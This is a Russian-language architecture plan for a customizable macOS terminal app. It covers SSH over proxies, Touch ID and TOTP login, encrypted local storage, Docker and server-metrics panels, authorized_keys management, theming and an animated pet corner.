# Кастомизируемый терминал для macOS — архитектурный план

**Имя:** Phosphor — по выбранному направлению; релизы с кодовыми именами, как у игр
**Платформа:** macOS 26+, Swift 6.3, SwiftUI + AppKit
**Дата:** 2026-09-02

---

## 1. Что строим

Нативный macOS-терминал, который совмещает три вещи, обычно разнесённые по разным приложениям:

1. **Терминал** — локальный и SSH, с доступом через прокси и входом по отпечатку, с глубокой кастомизацией (цвета, шрифт, фон-картинка, прозрачность, живые котята в отведённом углу).
2. **Панель управления сервером** — Docker-контейнеры, их логи и жизненные показатели, метрики железа (ядра, RAM, диск), SSH-ключи на сервере.
3. **MCP-сервер** — приложение отдаёт наружу инструменты, чтобы Claude Code / Claude Desktop мог работать с твоими серверами твоими же руками.

Ключевая идея: одно SSH-соединение к хосту мультиплексирует всё — интерактивный шелл, поток логов контейнера, опрос метрик, docker-команды. Не 5 логинов, а один.

| Хранение | Три уровня: Keychain, шифрованный профиль, открытые файлы | FileVault защищает только выключенный Мак; свой контейнер закрывает промежуток, пока ты залогинен |
| Сеть | Только SSH к твоим серверам и appcast | Ни телеметрии, ни внешних сервисов — «без интеграций» |

## 5. Слой SSH (`SSHKit`)

### 5.1 Транспорт за протоколом

Citadel — основной путь, но за абстракцией, чтобы «сложные» хосты не стали тупиком:

```swift
protocol SSHTransport: Sendable {
    func connect() async throws
    func exec(_ command: String) async throws -> Data
    func execStreaming(_ command: String) async throws -> ExecStreams   // stdout/stderr раздельно
    func openShell(term: String, cols: Int, rows: Int) async throws -> ShellChannel
    func close() async
}
```

- `CitadelTransport` — основная реализация.
- `SystemSSHTransport` — резерв: `/usr/bin/ssh` в PTY с `ControlMaster`. Нужен для хостов с `ProxyJump`, аппаратными ключами, 2FA/keyboard-interactive, экзотическим `~/.ssh/config`. Абстракция стоит ~50 строк, а спасает от переписывания половины приложения.

**Честно про риск:** NIOSSH/Citadel не читают `~/.ssh/config`, не ходят в `ssh-agent` сами и не расшифровывают ключи с passphrase. Но точка расширения есть: `SSHAuthenticationMethod.custom()` принимает делегата NIOSSH, и через него агент, ключи из Secure Enclave и `keyboard-interactive` делаются одним куском кода. Прыжок через бастион тоже есть — `jump(to:)`, см. §6.4.

Остаётся импорт `~/.ssh/config`, и это разовая операция, а не зависимость времени выполнения. Абстракция `SSHTransport` всё равно стоит полсотни строк и страхует на случай, если делегат не заработает; проверяем это первым делом, спайком S1 из §18.1.

### 5.2 Пул соединений

Один актор на хост. Внутри — одно TCP+SSH соединение, поверх него N каналов:

```swift
actor SSHConnection {
    private var client: SSHClient?
    private var shells: [SessionID: ShellChannel] = [:]
    private var metricsChannel: ExecStreams?
    private var logStreams: [ContainerID: ExecStreams] = [:]

    func ensureConnected() async throws { ... }   // ленивый коннект + reconnect: .always
    func run(_ cmd: String) async throws -> String
}
```

Реконнект: Citadel умеет `reconnect: .always`. Поверх — экспоненциальный бэкофф и событие в UI (баннер «переподключение…»), чтобы панели не мигали пустотой.

### 5.3 Аутентификация и доверие к хосту

- Методы: ed25519 / RSA приватный ключ (с passphrase из Keychain), пароль. `ssh-agent` — отдельная задача в Э2.
- Host key: **TOFU** — при первом подключении показываем fingerprint (`SHA256:...`) и спрашиваем. Принятые ключи в `~/Library/Application Support/Phosphor/known_hosts.json`. Смена ключа — красный экран-предупреждение, не тихое принятие. `hostKeyValidator: .acceptAnything()` из примеров Citadel — **только для dev**, в проде не оставлять.

### 5.4 Интерактивный шелл

Локальный терминал — `LocalProcessTerminalView` из SwiftTerm. SSH-терминал — голый `TerminalView` + свой делегат:

```swift
final class SSHTerminalView: TerminalView, TerminalViewDelegate {
    // TerminalView -> сеть
    func send(source: TerminalView, data: ArraySlice<UInt8>) {
        Task { await channel.write(Data(data)) }
    }
    // сеть -> TerminalView
    func onRemoteData(_ data: Data) {
        feed(byteArray: ArraySlice(data))
    }
    // ресайз окна -> SSH window-change
    func sizeChanged(source: TerminalView, newCols: Int, newRows: Int) {
        Task { await channel.resize(cols: newCols, rows: newRows) }
    }
}
```

## 6. Прокси и туннели (`ProxyKit`)

У тебя V2Box, и это меняет постановку задачи — в лучшую сторону. **Полный туннель нам не нужен.** Нужно, чтобы одно TCP-соединение до порта 22 конкретного сервера шло через прокси. Всё остальное на Маке нас не касается.

- Не нужны энтайтлменты Network Extension — мы не создаём системный туннель.
- Не нужно поднимать и опускать что-то глобальное, рискуя порвать чужой трафик. Отпадает и счётчик ссылок, обязательный для системного VPN.
- Прокси действует **только на соединения приложения**. Браузер, почта и всё прочее идут как шли.
- Настраивается **на каждый хост**: этот сервер через прокси, тот напрямую, третий через бастион.

### 6.1 Как это собирается

Схема проверена по документации обеих библиотек, а не предположена:

```swift
// 1. TCP до локального порта, который слушает V2Box
let channel = try await ClientBootstrap(group: group)
    .channelInitializer { channel in
        channel.pipeline.addHandler(SOCKSClientHandler())
    }
    .connect(host: "127.0.0.1", port: proxyPort)
    .get()

// 2. Просим прокси соединить нас с сервером — ПО ИМЕНИ, не по адресу
try await channel.writeAndFlush(
    SOCKSRequest(command: .connect, addressType: .domain(host.name, port: 22))
).get()

// 3. Отдаём готовый канал Citadel
let client = try await SSHClient.connect(on: channel, settings: host.sshSettings)
```

Три вещи делают сборку надёжной:

- `SOCKSClientHandler` живёт в `swift-nio-extras` — официальном пакете Apple. Не самоделка.
- У Citadel есть `SSHClient.connect(on:settings:)`, принимающий **готовый NIO-канал**. Это ровно та точка расширения, которая нужна, и она документирована.
- Адрес уходит в прокси **доменным именем**, а не IP: `SOCKSAddress.domain`. Резолвит его прокси на своей стороне — значит, ни утечки DNS, ни «а у меня этот домен не резолвится».

### 6.2 Как подружиться с V2Box

У V2Box нет ни командной строки, ни скриптового интерфейса — это приложение из App Store. Управлять им программно нельзя, и притворяться, что можно, не будем. Но для нашей схемы управление и не требуется:

| Режим V2Box | Что делает терминал |
|---|---|
| Локальный прокси (SOCKS/HTTP) | Ходим через `127.0.0.1:<порт>` явно, для помеченных хостов. **Основной путь** |
| TUN / глобальный | Ничего специального: трафик уже маршрутизируется системой, соединяемся напрямую |
| Выключен | Пробуем порт, он молчит — показываем «V2Box не запущен» с кнопкой, которая его открывает |

Живость прокси проверяется до того, как набирать SSH: TCP-проба на локальный порт плюс тестовый SOCKS-хендшейк. Это отличает «прокси лежит» от «сервер не отвечает» — без такого различения диагностика превращается в гадание.

### 6.3 Своё ядро вместо V2Box — позже

V2Box — оболочка над `xray-core`. Ядро можно положить в бандл sidecar-процессом, кормить его конфигом из ссылки `vless://` и слушать собственный локальный порт. Тогда внешний клиент не нужен вовсе: импортировал ссылку в менеджер хостов — и хост работает.

Цена: 30–40 МБ в бандле, подпись и нотаризация вложенного бинаря, обновления ядра на себе. Поэтому порядок такой: **сначала работаем с уже запущенным V2Box** (это не стоит ничего), встроенное ядро — отдельным этапом, когда остальное уже работает.

### 6.4 Способы дотянуться до хоста

Провайдер за протоколом остаётся, но прокси — лишь один из вариантов:

| Способ | Чем | Когда |
|---|---|---|
| SOCKS5-прокси | `NIOSOCKS` | V2Box, Xray или любой другой локальный порт. Основной для закрытых серверов |
| Напрямую | `ClientBootstrap` | Обычные хосты |
| Через бастион | `client.jump(to:)` | Прыжок с одного SSH-хоста на другой |
| Системный профиль | `scutil --nc start` | Корпоративный IKEv2, если однажды понадобится |
| Tailscale | `tailscale up` | Если однажды понадобится |

> **Попутно закрылась дыра из §4.** Третья строка — это `ProxyJump`, который я записывал в пробелы Citadel. Оказалось, метод `jump(to:)` там есть и документирован. Остаётся только то, что `~/.ssh/config` библиотека всё равно не читает: путь через бастион придётся задавать в менеджере хостов руками, а не наследовать из конфига.

Каждый хост получает поле «как дотянуться»: напрямую / через такой-то прокси / через такой-то бастион. Никакого глобального переключателя «VPN включён» — только явная привязка к хосту, которую видно в его карточке и в строке состояния окна.

## 7. Доступ: биометрия и 2FA (`AuthKit`)

Два разных механизма, которые легко перепутать: биометрия защищает приложение на твоём Маке, 2FA — это то, чего требует сервер. Делаем оба и связываем в одну цепочку.

> **Про Face ID сразу.** На Маках его нет ни на одной модели. Есть **Touch ID** (Apple Silicon MacBook и Magic Keyboard с сенсором) и разблокировка через Apple Watch. Поэтому «по отпечатку» делается полноценно, а запасными вариантами идут часы и пароль учётной записи. Подтверждение именно с айфона — это уже пуш в отдельное приложение, другой проект.

### 7.1 Вход в приложение по Touch ID

**Логинов и паролей в самом приложении нет вообще.** У него нет учётной записи, нечего регистрировать и нечего вспоминать: единственный вход — приложить палец.

При запуске приложение показывает экран блокировки: хосты, ключи, секреты и журнал аудита закрыты, пока не приложишь палец. Повторный запрос — после простоя, с настраиваемым порогом: сразу / пять минут / час / никогда.

**Открытые сессии при этом не рвутся.** Блокировка закрывает интерфейс, а не соединения. Иначе она однажды оборвёт долгий деплой — и ты выключишь её навсегда. SSH-каналы живут, вывод копится, после разблокировки всё на месте.

**Запасной вход обязателен.** Touch ID есть не на каждом Маке: на десктопе без Magic Keyboard с сенсором его нет вовсе. Берём политику `deviceOwnerAuthentication` — она сама поднимает Apple Watch или пароль учётной записи. Перед включением функции проверяем `canEvaluatePolicy` и честно показываем, что доступно. Запереть человека снаружи собственного приложения нельзя ни при каком раскладе.

Мелочь, которая экономит нервы: `touchIDAuthenticationAllowableReuseDuration`, чтобы серия опасных действий подряд не требовала пальца пять раз за минуту.

| Слой | Чем делается | Что даёт |
|---|---|---|
| Экран блокировки | `LAContext.evaluatePolicy` | Закрывает интерфейс от того, кто подошёл к твоему Маку |
| Замок на секретах | `SecAccessControl` в Keychain | Секрет физически не отдаётся системой без свежей проверки |

Первый слой без второго — картинка поверх открытых данных: кто дошёл до диска, тот их и забрал. Поэтому оба, и они независимы.

Оговорка про слово «аккаунт»: облачного аккаунта у приложения нет, есть локальный профиль — хосты, ключи, темы, котята. Touch ID защищает вход в него. Настоящий аккаунт появится только вместе с синхронизацией между машинами (см. §19).

### 7.2 Один пароль в последний раз

Что требует сервер — не в нашей власти. Но в нашей власти сделать так, чтобы ты вводил это **один раз за всю жизнь хоста**, а в лучшем случае ни разу.

1. Добавляешь хост и подключаешься паролем — единственный раз.
2. Приложение предлагает: «перевести на вход по Touch ID?»
3. Соглашаешься — в Secure Enclave рождается ключ ECDSA P-256, приватная часть оттуда не выйдет никогда. Публичная дописывается в `authorized_keys` тем же атомарным способом из §13.2, с бэкапом и проверкой, что доступ не потеряется.
4. Пароль стирается из памяти и никуда не сохраняется. Дальше — только палец.

Лучший случай — когда пароля не было и в первый раз: ключ пришёл из `ssh-agent` или импортировался вместе с хостом. Тогда первый шаг просто пропускается.

Чего обещать нельзя: если сервер сверх ключа требует пароль или код 2FA, отменить это с нашей стороны невозможно — требование живёт на сервере. Но набирать руками всё равно ничего не придётся: код подставит встроенный TOTP по тому же прикосновению (§7.4).

### 7.3 Биометрический замок

Правильная реализация — не «показать диалог, а потом прочитать пароль». Секрет физически недостижим без свежей проверки: элемент Keychain создаётся с политикой доступа, и система не отдаёт его, пока Touch ID не подтвердит.

```swift
let access = SecAccessControlCreateWithFlags(
    nil,
    kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
    .biometryCurrentSet,   // набор отпечатков сменился -> секрет недействителен
    nil
)
```

`biometryCurrentSet` инвалидирует секрет при изменении набора отпечатков — ровно то поведение, которое нужно. Но пользователя надо аккуратно провести через повторный ввод, а не показать ему «ошибка −25293».

Что закрывается замком:

- passphrase приватных ключей и пароли хостов;
- секреты TOTP;
- пишущие действия на помеченных хостах: удаление контейнера, правка `authorized_keys`, любой write-инструмент MCP;
- возврат в приложение после простоя — по желанию.

Уровень задаётся на каждый хост: не спрашивать / спрашивать при опасных действиях / спрашивать при подключении. Прод по умолчанию строже.

### 7.4 2FA на стороне сервера

Вторая дыра из §4: сервер отвечает `keyboard-interactive` и просит код. Нужен обработчик, поднимающий диалог с теми полями, которые прислал сервер — их может быть несколько, и они могут прийти повторно.

Обработчик — тот же `SSHAuthenticationMethod.custom()`, что и для агента: один делегат обслуживает оба сценария. Поверх — встроенный генератор TOTP: секрет лежит в Keychain под биометрией, приложение видит запрос вида `Verification code:`, ты прикладываешь палец, код подставляется сам. Touch ID и серверная 2FA соединяются в один жест вместо «открой телефон, найди приложение, перепечатай шесть цифр».

### 7.5 Ключи в Secure Enclave

Вариант, к которому стоит идти: ключ ECDSA P-256 рождается внутри Secure Enclave и оттуда никогда не выходит, каждое использование требует Touch ID. Для сервера это обычный `ecdsa-sha2-nistp256` — он ничего не замечает.

Подвох, которого не оказалось: подпись должен делать Enclave, а не библиотека, и сюда закладывался форк Citadel. На деле подходит всё тот же `SSHAuthenticationMethod.custom()` — делегат просто подписывает ключом из Enclave вместо файла. Неизвестности больше нет, есть работа.

## 8. Хранение данных (`VaultKit`)

На диске не должно лежать ничего чувствительного в открытом виде. Причина конкретная, а не «так надёжнее»: **FileVault защищает выключенный Мак.** Пока ты залогинен, файлы в `~/Library` читает любой процесс с твоими правами — установленная утилита, постустановочный скрипт из пакета, что угодно. Собственное шифрование закрывает именно этот промежуток.

### 8.1 Что вообще хранится

| Данные | Чувствительность | Где |
|---|---|---|
| Пароли хостов, passphrase ключей, секреты TOTP | Высшая | Keychain, под биометрией |
| Мастер-ключ профиля | Высшая | Keychain, под биометрией |
| Хосты: адрес, пользователь, порт, способ доступа | Средняя — это карта твоей инфраструктуры | Шифрованный профиль |
| `known_hosts` — отпечатки серверов | Целостность критична: подмена = MITM | Шифрованный профиль |
| Журнал аудита MCP | Средняя, целостность критична | Шифрованный профиль, append-only |
| Скроллбэк терминала | **Очень высокая** — там пролетают токены и дампы | По умолчанию нигде, см. §8.4 |
| Темы, паки питомцев, настройки вида | Низкая | Открытые файлы |
| История метрик | Низкая | Память, кольцевой буфер |

### 8.2 Три уровня, а не один

1. **Keychain — только маленькие секреты.** Пароли, passphrase, TOTP и мастер-ключ. Каждый элемент создаётся с `SecAccessControl` и флагом `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`: секрет не уезжает в бэкап и не появляется на другой машине. Не пытаемся хранить в Keychain что-то крупное — он для ключей, а не для базы.
2. **Шифрованный профиль — всё остальное чувствительное.** Один файл, зашифрованный мастер-ключом из Keychain.
3. **Открытые файлы — намеренно.** Темы, паки питомцев, настройки внешнего вида. Секретов там нет, зато их приятно править руками, класть в git и обмениваться ими. Шифровать их — вредная привычка, а не безопасность.

### 8.3 Как устроен шифрованный профиль

- Мастер-ключ: 32 случайных байта, генерируется при первом запуске, лежит в Keychain под Touch ID. На диск не попадает никогда.
- Шифрование: `ChaChaPoly` из CryptoKit (AEAD — сразу и шифрование, и защита от подмены). Отдельный nonce на каждую запись.
- Заголовок файла не шифруется и содержит версию схемы: без этого первая же миграция превратится в «файл не читается».
- **Запись атомарная:** временный файл → `fsync` → `rename`. Иначе падение посреди записи оставит обрезанный шифротекст, а это потеря всего профиля, а не одной записи.
- Перед миграцией схемы — копия предыдущего файла рядом.

### 8.4 Скроллбэк — отдельно и строго

История терминала опаснее всех остальных данных вместе взятых: через неё проходят токены, ключи в открытом виде, дампы баз. Поэтому:

- по умолчанию **не пишется на диск вообще** — живёт в памяти и умирает вместе с вкладкой;
- сохранение сессий включается явно, и тогда идёт в тот же шифрованный контейнер, со сроком хранения (7 или 30 дней) и кнопкой «забыть эту сессию»;
- никогда не попадает в журнал аудита, крэш-репорты и отладочные логи.

### 8.5 Где физически

```
~/Library/Application Support/Phosphor/
├── profile.phosphor        # шифрованный: хосты, доступы, known_hosts, аудит
├── settings.json       # открытый: внешний вид, горячие клавиши
├── themes/             # открытые JSON, можно держать в git
└── pets/               # паки питомцев

Keychain:
  phosphor.master-key            (биометрия)
  phosphor.host.<id>.password    (биометрия)
  phosphor.key.<id>.passphrase   (биометрия)
  phosphor.totp.<id>             (биометрия)
```

В `~/Library/Caches/Phosphor` не кладём ничего, что жалко потерять или страшно отдать.

### 8.6 Потеря ключа и перенос на другую машину

Мастер-ключ помечен `ThisDeviceOnly` — это осознанный выбор, и у него есть цена: **удалили ключ из Keychain, и профиль мгновенно нечитаем.** Это заодно и функция: так профиль уничтожается за секунду, без затирания диска.

Отсюда два обязательных механизма:

- **Экспорт профиля** — тот же контейнер, перешифрованный парольной фразой, которую задаёшь ты. Единственный способ перенести настройки на другой Мак, и единственная страховка от потери ключа.
- **Напоминание сделать экспорт** после того, как в профиле появится третий хост. Один раз, ненавязчиво, с возможностью отключить.

Синхронизация через iCloud намеренно не делается: она противоречит `ThisDeviceOnly` и превращает частную связку ключей в облачную. Если синхронизация понадобится — это будет обмен экспортированными файлами, а не автоматическое зеркало.

## 9. Хосты и файлы (`HostsKit`)

Референс — страницы хостов и SFTP в Termius. Берём структуру, не внешний вид: у нас фосфор.

### 9.1 Страница хостов

Раздел «Хосты» — стартовый экран после входа. Слева навигация раздела: **Хосты · Ключи · Проброс портов · Сниппеты · Известные хосты · Журнал**. Справа:

- **Строка поиска, которая одновременно командная.** Набрал `user@host` — подключился без сохранения. Набрал часть имени или тег — отфильтровал карточки.
- **Группы** — карточки с именем и числом хостов. Хост состоит в одной группе. Группа несёт общие настройки: способ доступа (прокси, бастион), тему и фон, ключ по умолчанию, режим MCP. Прод-группа красная — та самая идея из §13.
- **Хосты** — сетка карточек: иконка ОС, имя, строка тегов. Иконка определяется при первом подключении из `/etc/os-release` и живёт в профиле возможностей хоста.
- **Теги** — свободные метки поверх групп: `prod`, `api`, `games`. Группа одна, тегов сколько угодно. Группа несёт настройки, теги — только для поиска и фильтра.
- **«+ Новый хост»** и импорт: из `~/.ssh/config` (разовый, с таблицей «что распознал»), позже — из Termius (§19).

- Кнопка **«Подключиться»** прямо в строке поиска. Поиск ищет по имени, адресу, тегу **и группе**: набрал имя проекта — видишь только его хосты.
- Переключатель вида: сетка карточек / плотный список. На карточке — красная метка, если хост давно не отвечал или на нём чужой ключ; карандаш редактирования — по наведению.

Карточка при наведении показывает состояние: подключён ли, через что, сколько контейнеров. Двойной клик — терминал; правый клик — SFTP, проброс, «подключиться как…».

### 9.2 SFTP

Отдельный тип вкладки рядом с терминальными. Две панели: **локальная слева, удалённая справа**, обе — один и тот же компонент файлового списка.

- Хлебные крошки с назад/вперёд, `..` первой строкой.
- Колонки: имя (под ним права `drwxr-xr-x` и владелец), изменён, размер, тип. Сортировка по любой.
- Фильтр по имени и меню действий: скачать, загрузить, переименовать, удалить, права, новая папка, «открыть терминал здесь».
- **Перетаскивание между панелями** — это и есть загрузка и скачивание. И из Finder в удалённую панель тоже.
- Очередь передач внизу с прогрессом; большие файлы — с докачкой после обрыва.
- Пока хост не выбран, правая панель — пустое состояние с кнопкой «выбрать хост».

Технически — SFTP-подсистема Citadel поверх того же соединения, что и терминал: отдельного логина нет, файлы идут через тот же прокси или бастион, что и шелл.

### 9.3 Остальное в разделе

- **Ключи** — §11.
- **Проброс портов** — локальный и удалённый через `directTCPIP` Citadel. Список активных с состоянием; сохранённые привязаны к хосту и поднимаются при подключении по флагу.
- **Сниппеты** — сохранённые команды с плейсхолдерами вроде `{{container}}`. Запускаются в текущую вкладку или сразу на всех хостах группы — единственная многохостовая операция в v1.
- **Известные хосты** — отпечатки из TOFU-хранилища (§5.3): дата первого доверия и кнопка «забыть».
- **Журнал** — история подключений: куда, когда, через что. **Не содержимое сессий** — скроллбэк на диск не пишется (§8.4), только факт соединения.

### 9.4 Новый хост: ключ и автонастройка

**Ключ при добавлении.** Форма нового хоста сразу предлагает сгенерировать ключ: ed25519 в файле или P-256 в Secure Enclave (§7.5). Публичная часть заливается на сервер при первом подключении по паролю — тем же путём, что в §7.2. Пароль после этого не нужен.

**Прощупывание после первого входа.** Приложение собирает профиль хоста одним exec-каналом: `/etc/os-release`, uptime, список пользователей, есть ли `docker`, `nginx`, `certbot`, история `apt`, содержимое `/etc/nginx/sites-enabled`, запущенные контейнеры, чужие ключи в `authorized_keys`. Результат — вердикт **свежий / обжитой** и список недостающего. Профиль кэшируется и переиспользуется в §9 и §10.

**Если свежий** — справа сверху выезжает небольшой попап: что нашли, предложение пройтись по рецепту, кнопки «настроить / показать команды / позже». Не трогать — уйдёт сам. Если обжитой — попап не показывается вовсе; «донастроить» доступно из меню хоста и предлагает только недостающее.

**Рецепт.** Встроенный по умолчанию — то, что делается всегда:

1. обновить пакеты и включить `unattended-upgrades`;
2. Docker и Compose из официального репозитория — сразу с **лимитом логов** (`daemon.json`: `max-size 10m`, `max-file 3`) и `journald SystemMaxUse=500M`, иначе диск однажды кончится от логов контейнеров;
3. nginx;
4. certbot с плагином nginx — спрашивает домен и почту и **проверяет, что DNS домена указывает на этот сервер**; иначе не пытается;
5. **UFW**: входящие запрещены, открыты 22, 80, 443. Ловушка: Docker пишет правила в iptables в обход UFW, и `-p 5432:5432` откроет базу наружу. Поэтому рецепт проверяет compose-файлы на порты, опубликованные без `127.0.0.1:`, и подсвечивает их;
6. **закрыть вход по паролю** — `PasswordAuthentication no`, `PermitRootLogin prohibit-password`. Всегда последним и **только после того, как второе соединение по ключу успешно открылось**: так исключена самоблокировка, на которой ломаются обычные скрипты.

Порядок не случайный: пароли закрываются, когда всё остальное уже точно работает.

Рецепты редактируемые: шаги можно убирать, переставлять и добавлять свои из сниппетов (§8.3). Рецепт можно привязать к группе — тогда каждый новый сервер группы предлагается настроить именно им.

**Правила выполнения:**

- Каждый шаг идемпотентен: повторный запуск ничего не ломает. Что уже стоит — помечается «уже есть» и пропускается.
- Перед запуском — точный список команд; «показать команды» открывает его целиком. Скрытых действий нет.
- Выполнение — в отдельной вкладке с живым логом, остановить можно между шагами.
- Не root — пароль sudo запрашивается один раз через тот же замок Keychain.
- Дистрибутивы: Ubuntu и Debian первыми. Другие — «пока не поддерживается», без попыток угадать пакетный менеджер.

## 10. Docker (`DockerKit`)

### 10.1 Сбор данных

Всё через JSON-вывод CLI по SSH — по строке JSON на объект:

| Что | Команда |
|---|---|
| Список контейнеров | `docker ps -a --no-trunc --format '{{json .}}'` |
| Детали | `docker inspect <id>` (по запросу, не в цикле) |
| Мгновенные метрики | `docker stats --no-stream --format '{{json .}}'` |
| Логи (поток) | `docker logs -f --tail 500 --timestamps <id>` |
| Образы / тома / сети | `docker image ls --format '{{json .}}'` и т.д. |
| Стеки | группировка по метке `com.docker.compose.project` |

Опрос списка и stats — раз в 2–5 с (интервал настраиваемый, пауза когда окно неактивно). Логи — отдельный SSH-канал на контейнер, `executeCommandPair` даёт раздельные stdout/stderr.

### 10.2 Крайние случаи, которые надо обработать сразу

- `docker` требует `sudo` → детект по `permission denied on /var/run/docker.sock`, предложить `sudo` или добавление в группу `docker`.
- Rootless docker → нестандартный `DOCKER_HOST`; поле «префикс команды» в настройках хоста.
- `podman` вместо `docker` → та же CLI-грамматика, настраиваемый бинарь.
- Docker не установлен → панель показывает внятное «не найден», а не пустоту.

### 10.3 UI

- **Сайдбар:** дерево `хост → стек → контейнер`, цветной индикатор состояния (running/exited/unhealthy/restarting), поиск, ленивое раскрытие.
- **Вкладка Docker:** таблица со всеми полями, сортировка, мультивыбор.
- **Инспектор контейнера:** вкладки Overview / Logs / Stats / Env / Mounts / Networks / Exec.
- **Действия:** start, stop, restart, pause, kill, rm, `exec -it` (открывает новую вкладку терминала внутрь контейнера), pull, prune. Разрушающие (`rm`, `prune`, `kill`) — с подтверждением и именем контейнера в диалоге.
- **Логи:** виртуализированный список, «follow», поиск, фильтр по уровню, подсветка `ERROR`/`WARN`, копирование, выгрузка в файл, ограничение буфера (кольцевой, 50k строк) чтобы не съесть память.

## 11. Метрики (`MetricsKit`)

### 11.1 Сбор одним каналом

Вместо N exec-вызовов — один долгоживущий канал, печатающий снапшоты с префиксами записей:

```sh
while :; do
  echo "T $(date +%s)"
  echo "L $(cat /proc/loadavg)"
  echo "U $(cat /proc/uptime)"
  sed -n 's/^cpu/C cpu/p' /proc/stat
  awk '/^(MemTotal|MemFree|MemAvailable|Buffers|Cached|SwapTotal|SwapFree):/{print "M",$1,$2}' /proc/meminfo
  df -PB1 -x tmpfs -x devtmpfs | awk 'NR>1{print "D",$6,$2,$3,$4}'
  awk 'NR>2{gsub(":","",$1); print "N",$1,$2,$10}' /proc/net/dev
  echo "---"
  sleep 2
done
```

Парсер в Swift читает построчно до `---`, собирает снапшот.

- **CPU по ядрам:** `/proc/stat` даёт счётчики (user, nice, system, idle, iowait, irq, softirq, steal). Загрузка = `1 - Δidle/Δtotal` между снапшотами. Отдельно показываем `steal` — на VPS это прямой индикатор, что сосед по гипервизору ест твоё время.
- **RAM:** `MemAvailable` — правильная метрика «свободно», не `MemFree`. Отдельно swap.
- **Диск:** `df` по точкам монтирования, предупреждение при >85%.
- **Сеть:** дельта байт по интерфейсам → скорость.

Хранение: кольцевой буфер в памяти (последний час с шагом 2 с ≈ 1800 точек на серию — копейки). Долгая история — опционально в SQLite, только если попросишь.

### 11.2 Метрики контейнеров

Из `docker stats`: CPU %, память (использовано/лимит), сеть I/O, блочный I/O, PIDs. Плюс health-статус из `docker inspect` (`.State.Health.Status`) — «живость», о которой ты говорил.

### 11.3 Графики

Swift Charts. Спарклайны в сайдбаре, полноразмерные графики во вкладке «Мониторинг»: сетка ядер (heatmap или маленькие мультиграфики), RAM stacked area, диск — бары по разделам, сеть — двойная линия in/out.

## 12. SSH-ключи (`KeysKit`)

### 12.1 Ключи на сервере

Читаем `~/.ssh/authorized_keys` (и `/root/...`, и для других юзеров при наличии прав). Формат строки: `[options] keytype base64 [comment]`.

Fingerprint считаем **локально** в Swift, не гоняя `ssh-keygen` на сервере: SHA-256 от base64-декодированного blob → base64 без padding → `SHA256:...`. CryptoKit, 10 строк.

Показываем: тип (ed25519/rsa/ecdsa/sk-*), длина, комментарий, отпечаток, опции (`command=`, `from=`, `no-port-forwarding`), «этот ключ — твой» (совпадение с локальным). Предупреждение на слабые ключи (RSA < 3072, DSA).

### 12.2 Редактирование

Добавление/удаление/включение-выключение (комментирование строки). Запись — **атомарно**:

```sh
cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.phosphor.bak
cat > ~/.ssh/authorized_keys.phosphor.tmp <<'EOF'
<новое содержимое>
EOF
chmod 600 ~/.ssh/authorized_keys.phosphor.tmp
mv ~/.ssh/authorized_keys.phosphor.tmp ~/.ssh/authorized_keys
```

**Защита от самоблокировки:** если удаляемый ключ — тот, которым ты сейчас подключён, требуем явное подтверждение с галочкой. Бэкап остаётся на сервере. Дополнительно: перед применением проверяем, что после изменения останется хотя бы один рабочий ключ.

### 12.3 Локальные ключи

Обзор `~/.ssh/*.pub`, генерация новой пары (ed25519), копирование публичного ключа на сервер («ssh-copy-id» одной кнопкой), привязка ключа к хосту в менеджере хостов.

### 13.2 Фон

Слоёная композиция:

```
[NSVisualEffectView (blur)] → [NSImageView (картинка)] → [цветовой оверлей с alpha] → [TerminalView (bg = .clear)]
```

Управление: выбор картинки, режим (fill / fit / tile / center), непрозрачность оверлея, размытие картинки, прозрачность окна целиком (`window.isOpaque = false`).

**Полезная деталь:** фон и тема привязываются не только глобально, но и **к хосту**. Прод — красноватый, стейдж — синий. Визуально невозможно перепутать окно, в котором ты сейчас удаляешь контейнер. Это дешёвая функция с высокой отдачей.

### 13.3 Анимации

Общее ограничение для всех: только `transform` и `opacity`, плюс `stroke-dashoffset` на единичных контурах. Никакого JS в цикле, никакой анимации `blur`, теней и фильтров. При системной настройке «уменьшить движение» — сразу конечный кадр.

Три принципа, вынесенные из ресерча и обязательные для любого движения в приложении: **один главный объект**, **вдох перед действием**, **отпускание в разы быстрее набора**. Первая версия анимации входа провалилась ровно на этих трёх — двигалось пять объектов одинаковой скоростью без подготовки.

**Вход по отпечатку** — единственная яркая анимация в приложении, потому что случается один раз за сессию. Принят вариант **«дуга проверки»**: пока палец лежит, вокруг отпечатка по окружности бежит дуга — честная обратная связь «идёт чтение», а не пустое ожидание; замкнулась — вспышка обводки, короткий вдох (сжатие на 10 %) и щелчок с перелётом. Чтение ≈1,3 с, щелчок 200 мс. Сам отпечаток — петлевой узор из шести тонких гребней с разрывами и ядром, а не три толстые дуги.

**Продолжение жеста одобрено — «кинескоп»:** после вспышки глиф схлопывается в яркую горизонтальную линию, и она растягивается на весь экран с перелётом, как включался ЭЛТ-монитор. Проверка и празднование — одно движение: чтение ≈1,5 с, схлопывание 300 мс, развёртка 420 мс. Интерфейс к концу развёртки уже на месте. Эталон — артборд «B + C · вместе» в канвасе.

Анимация запуска приложения и фоновые состояния (простой, работа) — отдельно и позже: ранние варианты отклонены.

### 13.4 Импорт чужих тем

- `.itermcolors` — это XML plist со словарями `Ansi 0 Color` … и float-компонентами; парсится `PropertyListDecoder` напрямую.
- Alacritty `.toml` — плоский маппинг hex-строк.

Даёт мгновенный доступ к сотням готовых схем без своего редактора на старте.

| Откуда | Где в приложении | Что происходит |
|---|---|---|

| **Берсерк** | Мониторинг | Больше половины контейнеров хоста упали за минуту — заголовок «Затмение», и клеймо жертвы вместо точки состояния, пока не поднимутся |
| **Наруто** | Сниппеты | Запуск сниппета сразу на всех хостах группы — мигает «Теневое клонирование» |

## 14. Питомец в углу (`PetKit`)

Котятам выделен **свой угол** — небольшая зона в углу окна, за пределы которой они не выходят. Это не оверлей на весь терминал, а обитаемая коробка, живущая своей жизнью в стороне от работы.

### 14.1 Почему угол, а не всё окно

Ограничение снимает почти все проблемы, которые были бы у котят, бегающих по всему окну:

- Рабочий текст не перекрывается — котята его в принципе не пересекают.
- Площадь отрисовки маленькая и постоянная, значит и расход предсказуем.
- Не нужен модификатор для взаимодействия: в отведённой зоне по коту можно просто щёлкнуть.
- Не нужен поиск «полок» по всему интерфейсу — уголок сам себе сцена с известной геометрией.

Функция получается одновременно проще, дешевле и приятнее.

### 14.2 Кто живёт в углу: котёнок или сахарный поссум

